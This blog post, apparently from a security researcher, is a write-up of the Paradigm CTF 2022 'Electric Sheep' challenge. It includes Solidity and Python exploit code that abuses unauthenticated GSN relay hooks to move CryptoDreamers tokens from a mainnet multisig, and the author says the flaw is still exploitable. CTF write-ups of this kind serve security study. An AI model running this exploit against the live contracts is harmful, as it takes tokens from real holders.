@@ -1,0 +1,450 @@
+# Paradigm CTF 2022 - Electric Sheep
+
+<p className="text-xs text-right">August 22, 2022 by [patrickd](/about#patrickd)</p>
+
+The [CTF](https://ctf.paradigm.xyz/) just finished last night and I'm still recovering from a weekend of sleep deprivation, too much caffeine, and a horrible diet.
+
+Even so, I'm quite proud of being one of the few people who managed to solve [Electric Sheep](https://ctf.paradigm.xyz/challenges/electric-sheep) and many have asked for an explanation so this is where I'll start this write-up series.
+
+
+## The Context
+
+>Tags: PWN, YOU UP?
+
+The [file archive](https://ctf.paradigm.xyz/resources/electric-sheep.zip) provided for this challenge doesn't give much:
+
+```solidity
+interface ERC20Like {
+    function balanceOf(address) external view returns (uint);
+}
+
+contract Setup {
+    ERC20Like public immutable DREAMERS = ERC20Like(0x1C4d5CA50419f94fc952a20DdDCDC4182Ef77cdF);
+
+    function isSolved() external view returns (bool) {
+        return DREAMERS.balanceOf(address(this)) > 16 ether;
+    }
+}
+```
+
+There's some ERC20 Token and the Setup contract is supposed to end up owning more than 16 of them, which seems weirdly specific but okay. The Token is specified by its address, so that should mean it was already deployed on mainnet and we'll get access to a fork.
+
+And indeed, we're able to find it on [etherscan](https://etherscan.io/address/0x1C4d5CA50419f94fc952a20DdDCDC4182Ef77cdF). Turns out it's called "CryptoDreamers Token (CRDRT)" and, as you'd expect, it's worthless at this point and there haven't been any contract interactions for a long time. The deployer account doesn't easily give away who it belongs to, but a bit of Internet search yields [a tweet](https://twitter.com/multishq/status/1235954936141295617) belonging to "MultisHQ".
+
+[Multis, Inc.](https://multis.co/) is apparently dealing in "Corporate cards and financial software for web3". The most interesting thing I could take away from their website is "Multis is built with Gnosis Safe,
+the gold standard of self-custodial wallets", but aside from that it's a lot of marketing stuff and not very helpful for the challenge.
+
+After some more searching, I found an [old blogpost](https://medium.com/multis/gasless-multisig-1effc4700aad) that mentions a Token that sounds very similar to the one we're dealing with: "The CryptoDreamers Token (CDT) is a Token issued by Multis, simply holding it allows you to pay for gas in the process of creating a Multis account, with a 1:1 ratio to ETH."
+
+>"Technically, CDT is an implementation of the GSNRecipientERC20Fee interface, this is a rather complex payment strategy, but since it comes built-in with OpenZeppelin SDKs, integrating it was straight forward, since it boils down to extending your contract with both a GSNRecipientERC20Fee and a MinterRole so you can issue tokens."
+
+Finally some technical information on what we're most likely dealing with here. Reading this blogpost was very useful in obtaining a high-level understanding of what we'll be dealing with later.
+
+
+## The Funds
+
+There's still the question of where exactly we'll get those 16 ether worth of Dreamer Tokens from. Since it's such a specific amount, I expect that we probably won't have to mint it, most likely we'll need to take it from one of the existing [Token Holders](https://etherscan.io/token/0x1C4d5CA50419f94fc952a20DdDCDC4182Ef77cdF#balances). And there are actually only two accounts holding a balance high enough to do that, if combined, we could solve the challenge:
+
+* `13.175` held by a ["MultiSigWalletWithDailyLimit"](https://etherscan.io/address/0xb21090c8f6bac1ba614a3f529aae728ea92b6487#code) contract deployed by an unknown EOA account via the official Gnosis ["MultiSigWalletWithDailyLimitFactory"](https://etherscan.io/address/0x6e95c8e8557abc08b46f3c347ba06f8dc012763f#code).
+* `7.70716595067373386` held by an ["AdminUpgradeabilityProxy"](https://etherscan.io/address/0x16154f7e9de01e6b39dac3159805e9b1531ee3cf#code) pointing to ["GSNMultisigFactory"](https://etherscan.io/address/0x668a4e38fad2576db75aff1b3cb5a5e96da58d05#code) which was deployed by the same EOA as the Dreamer token, so it most likely belongs to Multis as well.
+
+I can't imagine though that we're supposed to find an issue within a Gnosis wallet that still holds a lot of money on mainnet. And finding one in the Factory wouldn't give us enough Tokens to solve the challenge, we're missing something...
+
+
+## The Token
+
+Problem is, the Dreamer token's bytecode is not verified so we'll have to do some decompilation.
+
+I use [EtherVM.io](https://ethervm.io/decompile/0x1C4d5CA50419f94fc952a20DdDCDC4182Ef77cdF) to obtain a nice list of all the public functions the contract has:
+
+```plaintext
+0x06fdde03 name()
+0x095ea7b3 approve(address,uint256)
+0x1624f6c6 initialize(string,string,uint8)
+0x18160ddd totalSupply()
+0x2348238c transferPrimary(address)
+0x23b872dd transferFrom(address,address,uint256)
+0x313ce567 decimals()
+0x39509351 increaseAllowance(address,uint256)
+0x40c10f19 mint(address,uint256)
+0x70a08231 balanceOf(address)
+0x95d89b41 symbol()
+0xa457c2d7 decreaseAllowance(address,uint256)
+0xa9059cbb transfer(address,uint256)
+0xc4d66de8 initialize(address)
+0xc6dbdf61 primary()
+0xdd62ed3e allowance(address,address)
+0xde7ea79d initialize(string,string,uint8,address)
+```
+
+The decompilation results themselves take a lot of effort to understand with this one though. So next I try the ["palkeoramix" decompiler](https://etherscan.io/bytecode-decompiler?a=0x1C4d5CA50419f94fc952a20DdDCDC4182Ef77cdF) on etherscan. It doesn't work well often, but when it does, it produces some really readable pesudo-code:
+
+```python
+def storage:
+    stor0 is uint8 at storage 0
+    stor0 is uint8 at storage 0 offset 8
+    stor0 is uint256 at storage 0 offset 8
+    ...
+    primaryAddress is addr at storage 157
+
+...
+
+def allowance(address _owner, address _spender) payable:
+    ...
+    if _spender != primaryAddress:
+        return stor52[addr(_owner)][addr(_spender)]
+    return -1
+
+def transferPrimary(address _param1) payable:
+    ..
+    if primaryAddress != caller:
+        revert ...
+    primaryAddress = _param1
+
+...
+
+def mint(address _to, uint256 _amount) payable:
+    ...
+    if primaryAddress != caller:
+        revert  ...
+    balanceOf[addr(_to)] += _amount
+
+...
+```
+
+We're in luck!
+
+I copied out the most interesting parts: There's a "primaryAddress" that has unlimited allowance to anyone else's funds and access to the mint function. There's also a `transferPrimary()` function allowing to overwrite this priviledged address - obviously only the primary can do that.
+
+The count of initialization functions seems a bit weird. The compiler also claims that SLOT 0, which is the one that all of them check and write, isn't consistently accessed. This made me wonder whether it might be the case that one initialization function incorrectly resets the value of another. A quick test showed that this is not the case though, attempting to call any of them will fail.
+
+Anyway, let's get back to the "primaryAddress": Turns out that it's actually set to the ["GSNMultisigFactory"](https://etherscan.io/address/0x668a4e38fad2576db75aff1b3cb5a5e96da58d05#code) contract we discovered previously, or more accurately, its proxy.
+
+
+## The Factory
+
+The Factory matches the description of the information about Multis so far: It deploys Gnosis Safes and implements `GSNRecipientERC20Fee` allowing one to do so via a Relay.
+
+Within its [source code](https://etherscan.deth.net/address/0x668a4e38fad2576db75aff1b3cb5a5e96da58d05#code) we can actually find the code belonging to the Token we just decompiled: "`__unstable__ERC20PrimaryAdmin`". In its description, it's mentioned that "`This contract is an internal helper for GSNRecipientERC20Fee, and should not be used outside of this context.`" - sounds a bit weird.
+
+But what we're actually interested in, are any calls made to this Token - and you should immediately stumble upon the `mint()` function:
+
+```solidity
+function mint(address account, uint256 amount) public onlyMinter {
+    _mint(account, amount);
+}
+```
+
+It's authenticated and the only minter registered is the same EOA that deployed it. So not this then.
+
+The only functions left doing interesting stuff are internal:
+
+```solidity
+/**
+ * @dev Implements the precharge to the user. The maximum possible charge (depending on gas limit, gas price, and
+ * fee) will be deducted from the user balance of gas payment Token. Note that this is an overestimation of the
+ * actual charge, necessary because we cannot predict how much gas the execution will actually need. The remainder
+ * is returned to the user in {_postRelayedCall}.
+ */
+function _preRelayedCall(bytes memory context) internal returns (bytes32) {
+    (address from, uint256 maxPossibleCharge) = abi.decode(context, (address, uint256));
+
+    // The maximum token charge is pre-charged from the user
+    _token.safeTransferFrom(from, address(this), maxPossibleCharge);
+}
+
+/**
+ * @dev Returns to the user the extra amount that was previously charged, once the actual execution cost is known.
+ */
+function _postRelayedCall(bytes memory context, bool, uint256 actualCharge, bytes32) internal {
+    (address from, uint256 maxPossibleCharge, uint256 transactionFee, uint256 gasPrice) =
+        abi.decode(context, (address, uint256, uint256, uint256));
+
+    // actualCharge is an _estimated_ charge, which assumes postRelayedCall will use all available gas.
+    // This implementation's gas cost can be roughly estimated as 10k gas, for the two SSTORE operations in an
+    // ERC20 transfer.
+    uint256 overestimation = _computeCharge(POST_RELAYED_CALL_MAX_GAS.sub(10000), gasPrice, transactionFee);
+    actualCharge = actualCharge.sub(overestimation);
+
+    // After the relayed call has been executed and the actual charge estimated, the excess pre-charge is returned
+    _token.safeTransfer(from, maxPossibleCharge.sub(actualCharge));
+}
+```
+
+These look a lot like callback functions that are called before and after the factory's `create()` function is called by a relayer.
+
+Maybe anyone can call them?
+
+```solidity
+function preRelayedCall(bytes calldata context) external returns (bytes32) {
+    require(msg.sender == getHubAddr(), "GSNRecipient: caller is not RelayHub");
+    return _preRelayedCall(context);
+}
+
+function postRelayedCall(bytes calldata context, bool success, uint256 actualCharge, bytes32 preRetVal) external {
+    require(msg.sender == getHubAddr(), "GSNRecipient: caller is not RelayHub");
+    _postRelayedCall(context, success, actualCharge, preRetVal);
+}
+```
+
+Nope, turns out the external versions actually authenticate who's calling in.
+
+They're still interesting though: The `preRelayedCall()` is able to transfer Tokens from anyone's account to the Factory contract. And `postRelayedCall()` transfers Tokens from the Factory to another address. Maybe we can use this...
+
+
+## The RelayHub
+
+The `getHubAddr()` function returns an address pointing to a ["RelayHub"](https://etherscan.io/address/0xd216153c06e857cd7f72665e0af1d7d82172f494#code) and well, things are about to get complicated.
+
+Here's the breakdown of how it works:
+
+An Owner can register their Relay by first staking a minimum of 1 ether via `function stake(address relay, uint256 unstakeDelay){:solidity}` and then calling `registerRelay(uint256 transactionFee, string memory url){:solidity}` from the Relay address. It's important to note that an Owner address can't be the Relay and a Relay can only be an EOA.
+
+A registered Relay can then call the `relayCall()` function:
+
+```solidity
+/**
+ * @notice Relay a transaction.
+ *
+ * @param from the client originating the request.
+ * @param recipient the target IRelayRecipient contract.
+ * @param encodedFunction the function call to relay.
+ * @param transactionFee fee (%) the relay takes over actual gas cost.
+ * @param gasPrice gas price the client is willing to pay
+ * @param gasLimit limit the client want to put on its transaction
+ * @param transactionFee fee (%) the relay takes over actual gas cost.
+ * @param nonce sender's nonce (in nonces[])
+ * @param signature client's signature over all params except approvalData
+ * @param approvalData dapp-specific data
+ */
+function relayCall(
+    address from,
+    address recipient,
+    bytes memory encodedFunction,
+    uint256 transactionFee,
+    uint256 gasPrice,
+    uint256 gasLimit,
+    uint256 nonce,
+    bytes memory signature,
+    bytes memory approvalData
+)
+```
+
+In our case, the `recipient` should always be the Factory contract and, as expected, the hooks will be called during the process. Here's the order:
+
+1. `acceptRelayedCall()`
+1. `preRelayedCall()`
+1. Calldata specified in `encodedFunction`
+1. `postRelayedCall()`
+
+I ignored the Factory's acceptance function before since it didn't do what we were looking for, here it is:
+
+```solidity
+/**
+ * @dev Ensures that only users with enough gas payment token balance can have transactions relayed through the GSN.
+ */
+function acceptRelayedCall(
+    address,
+    address from,
+    bytes calldata,
+    uint256 transactionFee,
+    uint256 gasPrice,
+    uint256,
+    uint256,
+    bytes calldata,
+    uint256 maxPossibleCharge
+)
+    external
+    view
+    returns (uint256, bytes memory)
+{
+    if (_token.balanceOf(from) < maxPossibleCharge) {
+        return _rejectRelayedCall(uint256(GSNRecipientERC20FeeErrorCodes.INSUFFICIENT_BALANCE));
+    }
+
+    return _approveRelayedCall(abi.encode(from, maxPossibleCharge, transactionFee, gasPrice));
+}
+```
+
+It checks whether we have enough Dream Tokens for the `maxPossibleCharge`.
+
+Well, we don't have any of the Dream Tokens, so normally this would make our relayed call fail at this point. "Normally" because normally a Relayer would want to be paid back for sending the transaction for us, but if we're both the Relayer and the person that signed the message, couldn't we do it for "free"?
+
+```solidity
+function requiredGas(uint256 relayedCallStipend) public view returns (uint256) {
+    return gasOverhead + gasReserve + acceptRelayedCallMaxGas + preRelayedCallMaxGas + postRelayedCallMaxGas + relayedCallStipend;
+}
+
+function maxPossibleCharge(uint256 relayedCallStipend, uint256 gasPrice, uint256 transactionFee) public view returns (uint256) {
+    return calculateCharge(requiredGas(relayedCallStipend), gasPrice, transactionFee);
+}
+
+function calculateCharge(uint256 gas, uint256 gasPrice, uint256 fee) private pure returns (uint256) {
+    // The fee is expressed as a percentage. E.g. a value of 40 stands for a 40% fee, so the recipient will be
+    // charged for 1.4 times the spent amount.
+    return (gas * gasPrice * (100 + fee)) / 100;
+}
+```
+
+Yes! If we pass a `gasPrice` of 0 to the `relayCall()` function the resulting `maxPossibleCharge` will actually be 0. This also resolves any issues with the pre- and post-callback functions: No Tokens will be precharged and no Tokens will be refunded, the transfer-calls wont complain about an insufficient balance.
+
+At this point I realized: Oh, I can just sign a transaction that calls those hooks. The check on `msg.sender` will pass since the transaction is being relayed via the Hub. I guess normally you're supposed to use the `context` constructed by `acceptRelayedCall()` to ensure that they can't be called "out of order", but there are no such checks here.
+
+We can use the `preRelayedCall()` function as a gadget allowing us to transfer arbitrary Token balances of anyone to the Factory. Since we're calling it directly, the post-hook won't be triggered and this "precharge" won't be refunded to the original owner. Our victim will be the ["MultiSigWalletWithDailyLimit"](https://etherscan.io/address/0xb21090c8f6bac1ba614a3f529aae728ea92b6487#code) that we found previously that holds most of the Tokens.
+
+After that, we can relay another call, this time directly to `postRelayedCall()` which allows us to take arbitrary amounts of Tokens out of the Factory contract.
+
+
+## The Exploit
+
+There's a lot going on here and I hadn't really understood everything at this point. But it would make a lot of sense so I just wanted to give it a quick try in Remix:
+
+I staked 1 ether via a smart contract and registered the EOA provided by the challenge as Relay.
+
+```solidity
+address immutable relay = msg.sender;
+uint256 constant private minimumStake = 1 ether;
+uint256 constant private minimumUnstakeDelay = 1 weeks;
+function stake() external payable {
+    hub.stake{value: minimumStake}(relay, minimumUnstakeDelay);
+}
+```
+
+Wrote some helper functions: One that returns the hash of the message we need to sign and the other one returns the ready-to-send calldata with the signature that we created outside.
+
+```solidity
+function relayCallHash(bytes memory encodedFunction) internal view returns (bytes32) {
+    bytes memory packed = abi.encodePacked(
+        "rlx:",
+        msg.sender, // from
+        address(factory), // recipient
+        encodedFunction,
+        uint256(0), // transactionFee
+        uint256(0), // gasPrice
+        uint256(300000), // gasLimit
+        hub.getNonce(msg.sender),
+        address(hub)
+    );
+    bytes32 hashedMessage = keccak256(abi.encodePacked(packed, relay));
+    return hashedMessage;
+}
+
+function relayCall(bytes memory encodedFunction, bytes memory signature) internal view returns (bytes memory data) {
+    data = abi.encodeWithSelector(
+        hub.relayCall.selector,
+        msg.sender, // from
+        address(factory), // recipient
+        encodedFunction,
+        uint256(0), // transactionFee
+        uint256(0), // gasPrice
+        uint256(300000), // gasLimit
+        hub.getNonce(msg.sender),
+        signature,
+        "" // approvalData
+    );
+}
+```
+
+Quick & dirty python script for signing these hashes:
+
+```python
+from eth_account.messages import defunct_hash_message
+from eth_account.account import Account
+
+private_key = 'PRIVATE_KEY_TO_SIGN_WITH'
+hash = 'HASH_TO_SIGN'
+
+msg_hash = defunct_hash_message(hexstr=hash)
+signed_msg_hash = Account.signHash(msg_hash, private_key)
+print(signed_msg_hash.signature.hex())
+```
+
+Using this, we can easily build the first call to the pre-hook:
+
+```solidity
+function relayCallHash_preRelayedCall(address takeAllFrom) external view returns (bytes32) {
+    bytes memory encodedFunction = abi.encodeWithSelector(
+        IGSNMultisigFactory.preRelayedCall.selector,
+        abi.encode( // context
+            takeAllFrom, // from ("precharge")
+            factory.token().balanceOf(takeAllFrom) // maxPossibleCharge
+        )
+    );
+    return relayCallHash(encodedFunction);
+}
+
+function relayCall_preRelayedCall(address takeAllFrom, bytes memory signature) external view returns (uint256 status, bytes memory) {
+    bytes memory encodedFunction = abi.encodeWithSelector(
+        IGSNMultisigFactory.preRelayedCall.selector,
+        abi.encode( // context
+            takeAllFrom, // from ("precharge")
+            factory.token().balanceOf(takeAllFrom) // maxPossibleCharge
+        )
+    );
+    return relayCall(encodedFunction, signature);
+}
+```
+
+First calling `relayCallHash_preRelayedCall()` will return us the hash we need to sign for the given relay parameters. Once signed (using the above python snippet) we can pass the signature into `relayCall_preRelayedCall()` and get back the calldata that we have to fire against the `RelayHub` contract.
+
+
+## (The Interlude)
+
+The first time I tried this, I immediately checked whether it worked and to great desperation, I noticed that the Token balance of the Factory contract was still the same as before. The way how RelayHub is built, any reverts happening during the relayed call will not cause the transaction to fail. This and the many moving parts involved made it rather hard to debug and after many hours of trial and error, I finally noticed that I had sent a `gasLimit` of 0. I thought that didn't matter since the `gasPrice` being 0 already would lead to a 0 in the overall multiplication anyways. What I overlooked was that this `gasLimit` was actually enforced on the relayed call:
+
+```solidity
+// The actual relayed call is now executed. The sender's address is appended at the end of the transaction data
+(atomicData.relayedCallSuccess,) = recipient.call.gas(gasLimit)(encodedFunctionWithFrom);
+```
+
+Oops.
+
+## The End
+
+With that working, the Factory contract now has a balance of `20,88216595067373386` – that's plenty to solve the challenge, now we just have to get it to the Setup contract.
+
+```solidity
+function relayCallHash_postRelayedCall() external view returns (bytes32) {
+    bytes memory encodedFunction = abi.encodeWithSelector(
+        IGSNMultisigFactory.postRelayedCall.selector,
+        abi.encode( // context
+            setup, // from ("returning" the "precharge")
+            factory.token().balanceOf(address(factory)), // maxPossibleCharge
+            uint256(0), // transactionFee
+            uint256(0) // gasPrice
+        ),
+        true, // success
+        uint256(0), // actualCharge
+        bytes32(0x0) // preRetVal
+    );
+    return relayCallHash(encodedFunction);
+}
+
+function relayCall_postRelayedCall(bytes memory signature) external view returns (uint256 status, bytes memory) {
+    bytes memory encodedFunction = abi.encodeWithSelector(
+        IGSNMultisigFactory.postRelayedCall.selector,
+        abi.encode( // context
+            setup, // from ("returning" the "precharge")
+            factory.token().balanceOf(address(factory)), // maxPossibleCharge
+            uint256(0), // transactionFee
+            uint256(0) // gasPrice
+        ),
+        true, // success
+        uint256(0), // actualCharge
+        bytes32(0x0) // preRetVal
+    );
+    return relayCall(encodedFunction, signature);
+}
+```
+
+Just as before we first call `relayCallHash_postRelayedCall()`, sign the returned hash, pass the signature to `relayCall_postRelayedCall()` and send the returned calldata to the `RelayHub`.
+
+And indeed, it worked!
+
+And yes, this whole thing should've been done in a single Python/JavaScript, but.. it was supposed to just be a quick check and ended up taking hours of debugging. So the clean solution never happened.
+
+Oh well.
+
+---
+
+*Note: This can still be exploited on mainnet, but you shouldn't. Yes, the tokens are basically worthless, but they're still not yours. Use a fork.*
